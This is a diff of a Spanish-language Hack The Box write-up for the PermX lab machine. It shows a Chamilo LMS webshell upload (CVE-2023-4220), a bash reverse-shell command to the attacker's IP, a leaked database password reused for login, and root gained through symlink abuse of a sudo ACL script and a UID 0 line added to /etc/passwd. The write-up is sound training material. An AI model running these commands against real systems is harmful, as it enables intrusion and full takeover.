@@ -1,10 +1,29 @@
 ---
 icon: desktop
+layout:
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
 ---
 
 # PermX
 
+`PermX` es una máquina Linux de dificultad fácil que cuenta con un sistema de gestión de aprendizaje vulnerable a la carga de archivos sin restricciones a través de [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220). Esta vulnerabilidad se aprovecha para obtener un punto de apoyo en la máquina. Al enumerar la máquina se revelan las credenciales que conducen al acceso SSH. Luego se explota una configuración incorrecta de `sudo` para obtener un shell `root`.
 
+<figure><img src="../../.gitbook/assets/PermX.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **PermX**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.23 -oG allPorts
@@ -28,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds
            Raw packets sent: 69837 (3.073MB) | Rcvd: 69847 (2.794MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -41,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.23 -A -oN targeted -oX targetedXML
@@ -75,37 +94,40 @@ Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
 
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep permx
 10.10.11.23 permx.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb http://permx.htb/
 http://permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.23], JQuery[3.4.1], Script, Title[eLEARNING]
 ```
 
-
+Accederemos a [http://permx.htb](http://permx.htb) y nos encontramos con la siguiente página web, parece tratarse de una página de un servicio de Learning.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una enumeración de directorios de la página web a través de `gobuster`. Obtuvimos el siguiente resultado, sin ninguna información relevante.
 
 ```bash
 ❯ gobuster dir -u http://permx.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 503,404
@@ -129,7 +151,9 @@ Starting gobuster in directory enumeration mode
 /js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]
 ```
 
+### Subdomain Enumeration
 
+Enumeramos posibles subdominios de la página web a través de `wfuzz` y logramos enumerar un subdominio llamado `lms.permx.htb`.
 
 ```bash
 ❯ wfuzz --hw=26 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.permx.htb" http://permx.htb 2>/dev/null
@@ -149,25 +173,29 @@ ID           Response   Lines    Word       Chars       Payload
 000025584:   200        352 L    940 W      19347 Ch    "lms"   
 ```
 
-
+Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep permx
 10.10.11.23 permx.htb lms.permx.htb
 ```
 
-
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb http://lms.permx.htb/
 http://lms.permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.10.11.23], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
 ```
 
+Al acceder a http://lmx.permx.htb, nos encontramos con un sitio web de `Chamilo LMS`. No logramos encontrar credenciales de defecto de la plataforma.
 
+{% hint style="info" %}
+Chamilo LMS es una plataforma de e-learning libre, licenciada bajo la GNU/GPLv3, de gestión del aprendizaje presencial, semi-presencial o virtual, cuyo propósito es mejorar la educación y su acceso a ella a nivel mundial.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al realizar una enumeración de directorios y archivos a través de `dirsearch`, logramos obtener diferentes archivos, como el `README` o `robots.txt`.
 
 ```bash
 ❯ dirsearch -u 'http://lms.permx.htb/' -t 50 -i 200 2>/dev/null
@@ -222,14 +250,26 @@ Target: http://lms.permx.htb/
 Task Completed
 ```
 
+## Initial Foothold
 
+### Chamilo LMS - Unrestricted File Upload \[Remote Code Execution] (CVE-2023-4220)
+
+Analizamos el archivo `README.md`, y logramos obtener la versión de `Chamilo LMS`.
 
 ```bash
 ❯ curl -s 'http://lms.permx.htb/README.md' | head -n 1
 # Chamilo 1.11.x
 ```
 
+Al realizar una búsqueda por Internet de posibles vulnerabilidades de esta versión, nos encontramos con el siguiente `CVE-2023-4220`.
 
+{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-4220" %}
+
+{% hint style="danger" %}
+Carga de archivos sin restricciones en la funcionalidad de carga de archivos grandes en **/main/inc/lib/javascript/bigupload/inc/bigUpload.php** en Chamilo LMS
+{% endhint %}
+
+Por otro lado, también logramos encontrar el siguiente repositorio de GitHub que nos permite realizar la explotación de dicha vulnerabilidad de `Unrestricted File Upload`.
 
 {% embed url="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc" %}
 
@@ -244,9 +284,7 @@ Recibiendo objetos: 100% (53/53), 16.08 KiB | 3.22 MiB/s, listo.
 Resolviendo deltas: 100% (27/27), listo.
 ```
 
-
-
-
+El primer paso, será lograr escanear la página web para verificar si es vulnerable. Esto lo podremos comprobar a través del módulo `scan` que nos ofrece el exploit.
 
 ```bash
 ❯ python3 main.py -u http://lms.permx.htb -a scan
@@ -254,7 +292,7 @@ Resolviendo deltas: 100% (27/27), listo.
 [+] Target is likely vulnerable. Go ahead. [+]
 ```
 
-
+Una vez localizado que el target es vulnerable, el siguiente paso será lograr subir una `webshell` al `Chamilo LMS`. Al ejecutar el exploit, se nos proporciona el acceso a la `webshell`.
 
 ```bash
 ❯ python3 main.py -u http://lms.permx.htb -a webshell
@@ -266,29 +304,27 @@ Enter the name of the webshell file that will be placed on the target server (de
 Webshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/gzzcoo.php?cmd=<command>
 ```
 
-
+Realizamos la comprobación para verificar si podemos llegar a ejecutar comandos. Probamos de ejecutar el comando `whoami` y obtuvimos el resultado esperado.
 
 ```bash
 ❯ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/gzzcoo.php?cmd=whoami'
 www-data
 ```
 
-
-
-
+El siguiente paso será lograr tener acceso al equipo. Por lo tanto, nos pondremos en escucha con la herramienta de `nc`.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos en la `webshell` que disponemos el siguiente comando para lograr obtener una Reverse Shell.
 
 ```bash
 ❯ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/gzzcoo.php?cmd=/bin/bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/10.10.16.7/443%200>%261"'
 ```
 
-
+Volviendo a nuestra terminal, verificamos que hemos logrado obtener acceso al sistema como usuario `www-data`.
 
 ```bash
 ❯ nc -nlvp 443
@@ -299,7 +335,11 @@ bash: no job control in this shell
 www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$
 ```
 
+## Initial Access
 
+### Information Leakage
+
+Revisamos si disponemos de algún privilegio o grupo que podamos intentar aprovecharnos para escalar privilegios o movernos lateralmente, pero no logramos obtener resultado positivo.
 
 ```bash
 www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
@@ -309,9 +349,7 @@ www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ sudo -l
 sudo: a password is required
 ```
 
-
-
-
+Enumerando el directorio de `/var/www/chamilo/app/config`, realizamos una búsqueda recursiva en todos los archivos para ver si había algún string con el valor `password`. Finalmente parece haber obtenido unas credenciales de la base de datos.
 
 ```bash
 www-data@permx:/var/www/chamilo/app/config$ ls -l
@@ -360,14 +398,20 @@ config.yml:    password:  "%mailer_password%"
 configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
 ```
 
+De los usuarios que disponen `bash` que enumeramos en `/etc/passwd`, probamos de autenticarnos con el usuario `mtz` y las credenciales obtenidas anteriormente y logramos el acceso.
 
+Visualizamos finalmente la flag de **user.txt**.
 
 ```bash
 www-data@permx:/var/www/chamilo/app/config$ su mtz
 Password: 
 mtz@permx:/var/www/chamilo/app/config$ cat /home/mtz/user.txt 
-a0fcaa21eec20435454cb45673b8ddd1
+a0fcaa21eec2*************************
 ```
+
+## Privilege Escalation
+
+### Abusing sudoers privilege
 
 
 
@@ -382,7 +426,12 @@ User mtz may run the following commands on permx:
     (ALL : ALL) NOPASSWD: /opt/acl.sh
 ```
 
+El script intenta restringir el acceso solo a archivos dentro de `/home/mtz/`, pero la validación es defectuosa:
 
+* Solo verifica que `$target` empiece con `/home/mtz/`, pero no bloquea correctamente rutas absolutas o enlaces simbólicos.
+* El check `"$target" == *..*` no es suficiente para prevenir **Path Traversal**.
+
+Si podemos ejecutar este script como `sudo`, podemos modificar permisos de cualquier archivo arbitrario fuera de `/home/mtz/`.
 
 ```bash
 mtz@permx:/var/www/chamilo/app/config$ cat /opt/acl.sh
@@ -411,14 +460,14 @@ fi
 /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
 ```
 
-
+Verificamos el uso del script, en el cual se debe indicar el usuario que se le otorgarán los permisos, el tipo de permisos y el archivo.
 
 ```bash
 mtz@permx:~$ sudo /opt/acl.sh 
 Usage: /opt/acl.sh user perm file
 ```
 
-
+Creamos un enlace simbólico apuntando a `/etc/passwd`. Usamos el script vulnerable para modificar los permisos ACL de `/etc/passwd`, otorgándonos control total. Verificamos que tenemos permisos de escritura sobre el archivo indicado, con lo cual podríamos llegar a editar el `/etc/passwd` y añadir una nueva entrada de un nuevo usuario `root`.
 
 ```bash
 mtz@permx:~$ ln -s /etc/passwd
@@ -435,14 +484,14 @@ mask::rwx
 other::r--
 ```
 
-
+Desde nuestro equipo, generaremos una nueva contraseña con `openssl`.
 
 ```bash
 ❯ openssl passwd -1 gzzcoo
 $1$ueWnORoK$bD1TcxJC6k99dh8sYay981
 ```
 
-
+Agregaremos un nuevo usuario (**gzzcoo**) con `UID 0` (**root**) a `/etc/passwd`. Verificamos que la entrada se ha añadido correctamente.
 
 ```bash
 mtz@permx:~$ echo 'gzzcoo:$1$4L3Rt/1x$sPjy3MZ5oXnuvx8L.Bi350:0:0:gzzcoo:/root:/bin/bash' >> /etc/passwd
@@ -453,11 +502,11 @@ mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
 gzzcoo:$1$4L3Rt/1x$sPjy3MZ5oXnuvx8L.Bi350:0:0:gzzcoo:/root:/bin/bash
 ```
 
-
+Finalmente, nos cambiamos al usuario creado y obtenemos acceso como usuario `root`, con lo cual podemos visualizar la flag de **root.txt**.
 
 ```bash
 mtz@permx:~$ su gzzcoo
 Password: 
 root@permx:/home/mtz# cat /root/root.txt 
-f9e947624c29ea3260a2810d473a14fa
+f9e947624c29********************
 ```
